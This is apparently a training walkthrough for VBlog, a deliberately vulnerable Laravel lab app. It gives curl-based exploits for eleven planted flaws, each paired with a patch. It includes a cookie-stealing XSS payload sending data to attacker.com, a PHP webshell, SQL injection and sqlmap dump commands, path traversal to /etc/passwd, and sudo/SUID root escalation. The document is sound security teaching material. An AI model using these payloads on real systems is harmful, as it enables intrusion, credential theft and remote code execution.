# VBlog — Walkthrough

## Table of Contents

1. [Setup](#setup)
2. [Credentials](#credentials)
3. [Vulnerabilities](#vulnerabilities)
4. [Hidden Routes](#hidden-routes)
5. [Hidden Subdomain](#hidden-subdomain)
6. [Full Escalation Chain](#full-escalation-chain)

> Detailed architecture: [docs/arquitecture.md](arquitecture.md)

---

## Download/Install

```bash
git clone https://github.com/Andonigt04/VBlog.git
```

## Setup

```bash
sudo docker compose up --build -d
```

The app is accessible at `http://localhost` (no `/etc/hosts` configuration required).

Students will discover through enumeration that `dev.vblog.local` exists as a subdomain and must add it manually to `/etc/hosts`.

---

## Credentials

### Application Users

| Role | Username | Email | Password |
|---|---|---|---|
| Admin | adm01 | adm01@vblog.local | adm01local |
| Editor | editor01 | editor01@vblog.local | editor01pass |
| User | (generated) | faker | faker |

> Editor and admin credentials also appear at `/backup` (intentional vulnerability).

### Database

| Field | Value |
|---|---|
| Host | postgresql (internal) / localhost:5432 (external) |
| Database | vblog |
| User | vblog_adm |
| Password | uireh34t34 |

### Direct DB Access (from host)

```bash
psql -h localhost -p 5432 -U vblog_adm -d vblog
# password: uireh34t34
```

---

## Vulnerabilities

---

### 1. IDOR — Unauthenticated Access to Resources

**Location:** `GET /api/users/{id}`, `GET /api/posts/{id}`, `GET /api/comments`

**Why it exists:** Routes have no `auth` middleware.

#### Exploitation

**Step 1: Enumerate users without being logged in**
```bash
curl http://vblog.local/api/users/1
curl http://vblog.local/api/users/2
# ... iterate until admin is found (typically id 52)
curl http://vblog.local/api/users/52
```

**Expected output:**
```json
{
  "id": 52,
  "name": "adm01",
  "email": "adm01@vblog.local",
  "role": "admin",
  "created_at": "..."
}
```

**Step 2: Get all comments without auth**
```bash
curl http://localhost/api/comments
```

**Impact:**
- Full user enumeration (emails, roles, names)
- Access to all comment data
- Enables targeted attacks (phishing, brute force against admin accounts)

#### Vulnerability Verification

**Code location:** `routes/api.php`
```php
Route::get('/users/{id}', [UserController::class, 'show']);   // ← NO auth middleware
Route::get('/comments', [CommentController::class, 'index']); // ← NO auth middleware
```

#### Full Patch

**File:** `routes/api.php`

```php
// vulnerable
Route::get('/users/{id}', [UserController::class, 'show']);
Route::get('/comments', [CommentController::class, 'index']);

// patched
Route::get('/users/{id}', [UserController::class, 'show'])->middleware('auth');
Route::get('/comments', [CommentController::class, 'index'])->middleware('auth');
```

#### Patch Validation

```bash
# Should fail with 401 Unauthorized
curl http://vblog.local/api/users/1
# Expected: {"status": 401, "message": "Unauthenticated"}

# Should work with authenticated session
curl -b cookies.txt http://vblog.local/api/users/1
```

---

### 2. Mass Assignment — Role Escalation via API

**Location:** `PUT /api/update/user/{id}` in UserController

**Why it exists:**
- `UserController::update()` uses `$user->update($request->all())` without filtering fields
- The `User` model has `role` in its `$fillable` array, allowing mass modification

#### Exploitation

**Step 1: Create a basic user account**
```bash
# Via web: register at /signup
# Or use credentials found at /backup
```

**Step 2: Log in and save session**
```bash
curl -c cookies.txt -X POST http://vblog.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","passkey":"password"}'
```

**Step 3: Verify current role**
```bash
curl -b cookies.txt http://vblog.local/api/me
# Output: {"id": 53, "role": "user", ...}
```

**Step 4: Escalate to editor**
```bash
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"editor"}'
```

**Step 5: Escalate to admin**
```bash
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**Impact:**
- Immediate privilege elevation
- Regular user → Admin without additional authentication
- Access to the admin panel

#### Vulnerability Verification

**Location:** `app/Http/Controllers/UserController.php`

```php
public function update(Request $request, $id)
{
    $user->update($request->all());  // ← Accepts ALL fields
}
```

**Location:** `app/Models/User.php`

```php
#[Fillable(['name', 'email', 'role', 'password'])]  // ← 'role' allowed
class User extends Model { ... }
```

#### Full Patch

**File 1:** `app/Http/Controllers/UserController.php`

```php
// ✅ AFTER (protected)
public function update(Request $request, $id)
{
    try {
        $user = User::findOrFail($id);

        if ($user->id !== Auth::id() && Auth::user()->role !== 'admin') {
            return response()->json(['status' => 403, 'message' => 'Unauthorized'], 403);
        }

        $validated = $request->validate([
            'name'     => 'nullable|string|max:255',
            'email'    => 'nullable|email|unique:users,email,' . $id,
            'password' => 'nullable|string|min:8'
        ]);

        $user->update($validated);
        return response()->json(['status' => 200, 'user' => $user]);
    }
}
```

#### Patch Validation

```bash
# Escalation attempt should fail
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
# Expected: {"status": 403, "message": "Unauthorized"}

# Changing own email should work
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"email":"newemail@test.com"}'
# Expected: {"status": 200, "user": {...}}
```

---

### 3. Broken Access Control — Dashboard Without Role Check

**Location:** `GET /dashboard` in `routes/web.php`

**Why it exists:** Middleware only checks `auth` (session active), not that the user is an admin.

#### Exploitation

```bash
# Log in as regular user, then access dashboard directly
curl -b cookies.txt http://vblog.local/dashboard
# Response: 200 OK with full admin panel HTML
```

**Impact:**
- Regular user sees admin data
- Access to sensitive information about other users

#### Full Patch

```php
// ✅ AFTER (protected)
Route::get('/dashboard', function (Request $request) {
    if (Auth::user()->role !== 'admin') {
        abort(403, 'Admin access required');
    }
    $users    = User::orderBy('created_at', 'desc')->paginate(10);
    $posts    = Post::orderBy('created_at', 'desc')->paginate(10);
    $comments = Comment::orderBy('created_at', 'desc')->paginate(10);
    return view('dashboard', compact('users', 'posts', 'comments', ...));
})->middleware('auth');
```

#### Patch Validation

```bash
# Regular user attempting access
curl -b cookies.txt http://vblog.local/dashboard
# Expected: 403 Forbidden

# Admin user accessing
curl -b admin_cookies.txt http://vblog.local/dashboard
# Expected: 200 OK with panel
```

---

### 4. Insecure Cookies

**Location:** `config/session.php`

**Why it exists:** Security flags intentionally disabled.

#### Vulnerability

```php
'http_only' => env('SESSION_HTTP_ONLY', false),  // ← FALSE = JavaScript can read
'secure'    => env('SESSION_SECURE_COOKIE'),      // ← NOT SET = sent over HTTP
'same_site' => env('SESSION_SAME_SITE', null),    // ← NULL = no SameSite
```

#### Exploitation

**Step 1: Inject XSS in a comment (vuln #5)**

```javascript
<script>
  fetch('http://attacker.com/?c=' + document.cookie);
</script>
```

**Step 2: Admin visits the post with the XSS comment**
```
→ JavaScript executes in admin context
→ Session cookie sent to attacker.com
→ Attacker can impersonate the admin
```

#### Full Patch

```php
// ✅ AFTER (secure)
'http_only' => env('SESSION_HTTP_ONLY', true),
'secure'    => env('SESSION_SECURE_COOKIE', true),
'same_site' => env('SESSION_SAME_SITE', 'lax'),
```

#### Patch Validation

```bash
curl -v http://vblog.local/ 2>&1 | grep Set-Cookie
# Should show:
# Set-Cookie: LARAVEL_SESSION=...; path=/; HttpOnly; SameSite=Lax
```

---

### 5. Missing Security Headers

**Location:** `nginx/server.conf`

**Why it exists:** Lines intentionally commented out.

#### Vulnerability

```nginx
# add_header X-Frame-Options "SAMEORIGIN";
# ↑ Without this: app embeddable in iframes (clickjacking)

# add_header X-Content-Type-Options "nosniff";
# ↑ Without this: browser may misinterpret MIME types
```

#### Exploitation

```html
<!-- Clickjacking: embed the app in an invisible iframe -->
<iframe src="http://vblog.local/dashboard"
        style="opacity: 0; position: absolute; width: 100%; height: 100%;">
</iframe>
```

#### Full Patch

```nginx
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'";
add_header Referrer-Policy "strict-origin-when-cross-origin";
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()";
```

#### Patch Validation

```bash
docker compose restart nginx
curl -I http://vblog.local/
# Should show:
# X-Frame-Options: SAMEORIGIN
# X-Content-Type-Options: nosniff
```

---

### 6. Stored XSS — Comment Injection

**Location:**
- `resources/views/layouts/comment.blade.php`
- `app/Http/Controllers/CommentController.php`

**Why it exists:**
- Content rendered unescaped: `{!! $comment->content !!}`
- No sanitization before saving

#### Exploitation

```bash
curl -b cookies.txt -X POST http://vblog.local/comments \
  -d "post_id=1&content=<script>alert(document.cookie)</script>&_token=CSRF_TOKEN"
```

**Any user visiting the post:**
- Script executes in their browser
- If `HttpOnly` is false, the cookie can be stolen
- Especially dangerous if an admin visits the post

#### Full Patch

**File 1:** `resources/views/layouts/comment.blade.php`

```blade
{{-- ✅ AFTER (escaped) --}}
<p id="comment-text-{{ $comment->id }}" class="text-zinc-200">
    {{ $comment->content }}
</p>
```

**File 2:** `app/Http/Controllers/CommentController.php`

```php
// ✅ AFTER (sanitized)
Comment::create([
    'content' => strip_tags($validated['content']),
    'user_id' => Auth::id(),
    'post_id' => $validated['post_id'],
]);
```

---

### 7. Information Disclosure

**Locations:**
- `routes/web.php` (`/backup`, `/debug`)
- `GET /api/users` without auth

#### Exploitation

**Step 1: Access `/backup`**

```bash
curl http://vblog.local/backup
```

**Expected output:**
```
[APP_CREDENTIALS]
editor_user=editor01
editor_pass=editor01pass
admin_user=adm01
admin_email=adm01@vblog.local
admin_pass=adm01local

[DATABASE]
host=postgresql
port=5432
database=vblog
user=vblog_adm
password=uireh34t34
```

**Step 2: Access `/debug`**

```bash
curl http://vblog.local/debug
```

**Expected output:**
```json
{
  "app": "VBlog",
  "php": "8.4.x",
  "db_driver": "pgsql",
  "users": 52,
  "server": "nginx/1.27.0"
}
```

**Impact:**
- Admin credentials in plaintext
- Database connection string
- Technology fingerprinting (facilitates exploit search)

#### Full Patch

```php
// ✅ AFTER (protected)
Route::get('/backup', function () {
    if (Auth::guest() || Auth::user()->role !== 'admin') {
        abort(403);
    }
    // ...
})->middleware('auth');

Route::get('/debug', function () {
    if (Auth::guest() || Auth::user()->role !== 'admin') {
        abort(403);
    }
    return response()->json([...]);
})->middleware('auth');
```

---

### 8. Path Traversal — Arbitrary File Read (admin)

**Location:** `GET /api/admin/file?path=` in `AdminController::fileRead()`

**OWASP:** A01 — Broken Access Control / A05 — Security Misconfiguration  
**CWE:** CWE-22 (Path Traversal)

**Why it exists:** The `path` parameter is concatenated directly with `base_path()` without normalization or allowlist.

#### Exploitation

**Prerequisite:** Session with `role=admin` (obtained from vuln #2).

**Step 1: Read the app's `.env`**
```bash
curl -b cookies.txt \
  "http://localhost/api/admin/file?path=.env"
```
Output: full `.env` content with `APP_KEY`, DB credentials, etc.

**Step 2: Break out of the app directory**
```bash
curl -b cookies.txt \
  "http://localhost/api/admin/file?path=../../etc/passwd"
```
Output: `/etc/passwd` from the container → list of system users.

**Impact:**
- Read any file readable by `www-data`
- Exposure of private keys, `.env`, service configurations
- Enables more precise SQLi payloads or upload path discovery

#### Vulnerability Verification

**File:** [app/Http/Controllers/AdminController.php](../../app/Http/Controllers/AdminController.php)
```php
public function fileRead(Request $request)
{
    $path     = $request->query('path', '');
    $fullPath = base_path($path);           // ← no validation
    return response(file_get_contents($fullPath), 200)
        ->header('Content-Type', 'text/plain');
}
```

#### Full Patch

```php
// ✅ AFTER (directory allowlist + normalization)
public function fileRead(Request $request)
{
    $path     = $request->query('path', '');
    $fullPath = realpath(base_path($path));
    $allowed  = realpath(base_path('storage/app'));

    if (!$fullPath || !str_starts_with($fullPath, $allowed)) {
        abort(403, 'Path not allowed');
    }

    return response(file_get_contents($fullPath), 200)
        ->header('Content-Type', 'text/plain');
}
```

#### Patch Validation

```bash
# Should fail
curl -b cookies.txt "http://localhost/api/admin/file?path=../../etc/passwd"
# Expected: 403 Forbidden

# Should work only inside storage/app
curl -b cookies.txt "http://localhost/api/admin/file?path=storage/app/info.txt"
```

---

### 9. SQL Injection — Injectable Filter in Stats Endpoint (admin)

**Location:** `GET /api/admin/stats?filter=` in `AdminController::stats()`

**OWASP:** A03 — Injection  
**CWE:** CWE-89 (SQL Injection)

**Why it exists:** The `filter` value is interpolated directly into a raw SQL query without `DB::select()` bindings or preparation.

#### Exploitation

**Step 1: Confirm injection with an error**
```bash
curl -b cookies.txt \
  "http://localhost/api/admin/stats?filter='"
# Output: 500 with PostgreSQL SQL trace
```

**Step 2: Time-based blind (confirm execution)**
```bash
curl -b cookies.txt \
  "http://localhost/api/admin/stats?filter=%' AND (SELECT 1 FROM pg_sleep(3))=1 AND '%'='"
# Response takes ≥3 s → confirmed
```

**Step 3: Data extraction with sqlmap**
```bash
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="$(grep -v '^#' /tmp/cookies.txt | awk '/laravel_session/{print $6"="$7}')" \
  --dbms=postgresql --level=3 --risk=2 --batch \
  --dump -T users
```

**Impact:**
- Full database dump
- File read/write (`COPY TO/FROM`) if the DB user has permissions
- Possible OS command execution in older PostgreSQL configurations

#### Vulnerability Verification

**File:** [app/Http/Controllers/AdminController.php](../../app/Http/Controllers/AdminController.php)
```php
public function stats(Request $request)
{
    $filter = $request->query('filter', '');
    $rows   = DB::select(
        "SELECT posts.id, posts.title, posts.tags
         FROM posts
         WHERE posts.tags LIKE '%{$filter}%'"  // ← direct interpolation
    );
    return response()->json(['status' => 200, 'data' => $rows]);
}
```

#### Full Patch

```php
// ✅ AFTER (binding with placeholder)
public function stats(Request $request)
{
    $filter = $request->query('filter', '');
    $rows   = DB::select(
        "SELECT posts.id, posts.title, posts.tags
         FROM posts
         WHERE posts.tags LIKE ?",
        ["%{$filter}%"]   // ← safe binding
    );
    return response()->json(['status' => 200, 'data' => $rows]);
}
```

#### Patch Validation

```bash
curl -b cookies.txt \
  "http://localhost/api/admin/stats?filter=%27%20OR%201=1--"
# Expected: [] or normal results, NOT an SQL trace
```

---

### 10. Insecure File Upload — Webshell via Unrestricted Upload (admin)

**Location:** `POST /api/admin/upload` in `AdminController::upload()`

**OWASP:** A04 — Insecure Design / A05 — Security Misconfiguration  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Why it exists:** The server saves the file with the original name without checking the extension and places it in `public/avatars/`, a directory served directly by nginx.

#### Exploitation

**Step 1: Create the webshell**
```bash
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php
```

**Step 2: Upload to the server**
```bash
curl -b cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
# Output: {"url":"http://localhost/avatars/shell.php"}
```

**Step 3: Execute remote commands (RCE)**
```bash
# Process identity
curl "http://localhost/avatars/shell.php?cmd=aWQ="         # id
# Output: uid=33(www-data) gid=33(www-data)

# List sensitive files
curl "http://localhost/avatars/shell.php?cmd=bHMgLWxhIC9ldGMv"  # ls -la /etc/
```

**Impact:**
- Remote Code Execution as `www-data`
- Pivot to the database, internal network, or local escalation
- Persistence in the container

#### Vulnerability Verification

**File:** [app/Http/Controllers/AdminController.php](../../app/Http/Controllers/AdminController.php)
```php
public function upload(Request $request)
{
    $file     = $request->file('file');
    $filename = $file->getClientOriginalName();  // ← attacker-controlled name
    $file->move(public_path('avatars'), $filename);
    return response()->json(['url' => url("avatars/{$filename}")], 201);
}
```

#### Full Patch

```php
// ✅ AFTER (allowlist + random filename)
public function upload(Request $request)
{
    $request->validate([
        'file' => 'required|file|mimes:jpeg,png,gif,webp|max:2048',
    ]);

    $file     = $request->file('file');
    $filename = Str::uuid() . '.' . $file->extension();
    $file->move(public_path('avatars'), $filename);

    return response()->json(['url' => url("avatars/{$filename}")], 201);
}
```

**Additional measure:** configure nginx to block PHP execution in `public/avatars/`:
```nginx
location ~* ^/avatars/.*\.php$ {
    deny all;
}
```

#### Patch Validation

```bash
# Uploading shell.php should be rejected
curl -b cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php"
# Expected: 422 Unprocessable Entity

# Uploading a valid image should work
curl -b cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@photo.jpg;type=image/jpeg"
# Expected: 201 with URL
```

---

### 11. Privilege Escalation — From www-data to root

**Location:** Dockerfile — sudoers + SUID bash

**OWASP:** A06 — Vulnerable and Outdated Components / A05 — Security Misconfiguration  
**CWE:** CWE-269 (Improper Privilege Management)

**Why it exists:** The Dockerfile adds two intentional misconfigurations:
1. `www-data` can run `/usr/bin/find` as root without a password
2. `/tmp/rootbash` is a copy of `/bin/bash` with the SUID bit set

#### Exploitation

**Prerequisite:** RCE obtained in vuln #10 (active webshell).

**Step 1: Check sudo**
```bash
curl "http://localhost/avatars/shell.php?cmd=c3VkbyAtbA=="
# base64: sudo -l
# Output: (root) NOPASSWD: /usr/bin/find
```

**Step 2: GTFOBins — use find with sudo to execute a command as root**
```bash
CMD=$(echo 'sudo find . -exec /bin/sh -c '"'"'id > /tmp/pwned'"'"' \; -quit' | base64 -w0)
curl "http://localhost/avatars/shell.php?cmd=$CMD"

curl "http://localhost/avatars/shell.php?cmd=$(echo 'cat /tmp/pwned' | base64 -w0)"
# Output: uid=0(root) gid=0(root) ← ROOT
```

**Step 3 (alternative): SUID bash**
```bash
CMD=$(echo '/tmp/rootbash -p -c id' | base64 -w0)
curl "http://localhost/avatars/shell.php?cmd=$CMD"
# Output: uid=33(www-data) euid=0(root) ← effective SUID
```

**Impact:**
- Full container control as root
- Read system secrets (`/etc/shadow`, SSH keys)
- Possible container escape if the Docker socket is mounted

#### Vulnerability Verification

**File:** [Dockerfile](../../Dockerfile)
```dockerfile
RUN echo "www-data ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data \
    && chmod 0440 /etc/sudoers.d/www-data \
    && cp /bin/bash /tmp/rootbash \
    && chmod u+s /tmp/rootbash
```

#### Full Patch

```dockerfile
# ✅ AFTER (remove both lines — no sudoers, no SUID)
# (simply delete the above RUN commands from the Dockerfile)
```

**Principle of least privilege:** the web process should never run commands as root. Use unprivileged users with no sudo access.

#### Patch Validation

```bash
# From webshell: sudo should fail
sudo -l
# Expected: sudo: command not found (or permission denied)

# SUID bash should not exist
ls -la /tmp/rootbash
# Expected: No such file or directory
```

---

## Hidden Routes

None appear in menus or links. Discoverable with `gobuster`, `ffuf`, or `dirsearch`.

| Route | Code | Content | Patch |
|---|---|---|---|
| `/backup` | 200 OK | Editor and admin credentials in plaintext | Protect with auth + admin check |
| `/debug` | 200 OK | App version, PHP, DB driver, counts | Protect with auth + admin check |
| `/old` | 302 | Redirects to `/` | No patch needed (decoy) |
| `/internal` | 403 | Forbidden | No patch needed (decoy) |
| `/admin` | 302 | Redirects to `/dashboard` | No patch needed (safe redirect) |

**Student enumeration:**

```bash
gobuster dir -u http://vblog.local \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

---

## Hidden Subdomain

**URL:** `http://dev.vblog.local`

**Requirement:** Add to `/etc/hosts`:
```
127.0.0.1  dev.vblog.local
```

**Content:**

| Page | Description |
|---|---|
| `/` (index.html) | Status panel: environment, framework, DB, quick endpoints |
| `/api-docs.html` | Full internal API documentation with vulnerability notes and curl examples |
| `/logs.html` | App logs with DB connection string, mass assignment traces, and XSS hints |

**No authentication** — Panel requires no login (intentional vulnerability).

**Subdomain enumeration:**

```bash
gobuster vhost -u http://vblog.local \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

**Useful information in `/logs.html`:**
- DB connection string: `postgresql://vblog_adm:uireh34t34@postgresql:5432/vblog`
- Mass assignment traces: `PUT /api/update/user/53 body={"role":"admin"}`
- XSS hint in comments

---

## Full Escalation Chain

```
Phase 0 — Reconnaissance (anonymous)
│
│  1. gobuster dir → /backup, /debug, /old, /internal
│  2. gobuster vhost → dev.vblog.local
│  3. curl /backup → editor01 + admin + DB credentials
│  4. curl /debug → PHP version, driver, counts
│  5. ffuf /api/users/FUZZ → user ID enumeration (IDOR)
│  6. curl -I / → no X-Frame-Options, no CSP, no security headers
│
▼
Phase 1 — Registered user
│
│  1. POST /api/login with editor01/editor01pass (from /backup)
│  2. GET /api/me → role: "editor"
│
▼
Phase 2 — Escalation to Admin (Mass Assignment)
│
│  1. PUT /api/update/user/{my_id} -d '{"role":"admin"}'
│  2. GET /api/me → role: "admin"  ✓ Escalation successful
│  3. GET /dashboard → access granted (broken access control)
│
▼
Phase 3 — XSS Exploitation + Internal Access
│
│  1. POST /api/create/comment with <script>…</script> payload
│  2. XSS executes when any user visits the post
│  3. Cookie stealable (HttpOnly=false) → session impersonation
│  4. /etc/hosts: 127.0.0.1 dev.vblog.local
│  5. GET http://dev.vblog.local/logs.html → full DB connection string
│  6. psql -h localhost -p 5432 -U vblog_adm -d vblog → DB compromised
│
▼
Phase 4 — Admin Panel: Path Traversal + SQLi
│
│  1. GET /api/admin/file?path=.env → APP_KEY + credentials in plaintext
│  2. GET /api/admin/file?path=../../etc/passwd → system users
│  3. GET /api/admin/stats?filter=' → SQL error, PostgreSQL confirmed
│  4. sqlmap → full dump of users table with password hashes
│
▼
Phase 5 — RCE via File Upload
│
│  1. echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > shell.php
│  2. POST /api/admin/upload -F file=@shell.php → URL: /avatars/shell.php
│  3. GET /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)
│
▼
Phase 6 — Escalation to root
│
│  1. sudo -l → (root) NOPASSWD: /usr/bin/find
│  2. sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
│     → uid=0(root)  ✓ ROOT OBTAINED
│  Or:
│  3. /tmp/rootbash -p -c id → euid=0(root)  ✓ SUID bash

```

---

## Patch Summary

| # | Vuln | OWASP | File | Action |
|---|---|---|---|---|
| 1 | IDOR | A01 | routes/api.php | Add `middleware('auth')` |
| 2 | Mass Assignment | A04 | UserController.php | Validate input, exclude `role` from fillable or use `only()` |
| 3 | Broken Access Control | A01 | routes/web.php | Check `role === 'admin'` in /dashboard |
| 4 | Insecure Cookies | A05 | config/session.php | `HttpOnly=true`, `SameSite=lax` |
| 5 | Missing Headers | A05 | nginx/server.conf | Uncomment security headers |
| 6 | Stored XSS | A03 | comment.blade.php | Change `{!! !!}` to `{{ }}`; `strip_tags()` in controller |
| 7 | Info Disclosure | A05 | routes/web.php | Protect `/backup`, `/debug` with `auth` + admin check |
| 8 | Path Traversal | A01/A05 | AdminController.php | `realpath()` + directory allowlist |
| 9 | SQL Injection | A03 | AdminController.php | Bindings with `?` in `DB::select()` |
| 10 | File Upload | A04/A05 | AdminController.php | Validate `mimes:`, random filename; nginx blocks `.php` in avatars |
| 11 | Root Privesc | A06 | Dockerfile | Remove sudoers entry and SUID bash |
